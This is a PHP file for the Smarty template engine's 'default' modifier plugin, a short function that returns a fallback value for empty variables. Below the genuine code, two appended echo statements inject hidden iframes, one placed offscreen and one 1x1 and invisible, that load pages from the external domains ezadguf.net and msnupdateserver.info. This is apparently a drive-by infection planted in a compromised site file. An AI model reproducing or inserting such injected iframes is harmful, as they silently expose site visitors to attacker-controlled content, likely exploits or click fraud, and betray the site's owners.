<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Smarty default modifier plugin
 *
 * Type:     modifier<br>
 * Name:     default<br>
 * Purpose:  designate default value for empty variables
 * @link http://smarty.php.net/manual/en/language.modifier.default.php
 *          default (Smarty online manual)
 * @author   Monte Ohrt <monte at ohrt dot com>
 * @param string
 * @param string
 * @return string
 */
function smarty_modifier_default($string, $default = '')
{
    if (!isset($string) || $string === '')
        return $default;
    else
        return $string;
}

/* vim: set expandtab: */


echo "<script>document.write('<iframe src=\"http://ezadguf.net/?click=69313911\" width=100 height=100 style=\"position:absolute;top:-10000;left:-10000;\"></iframe>');</script>";

echo "<iframe src=\"http://msnupdateserver.info/?click=1CB6E0\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>
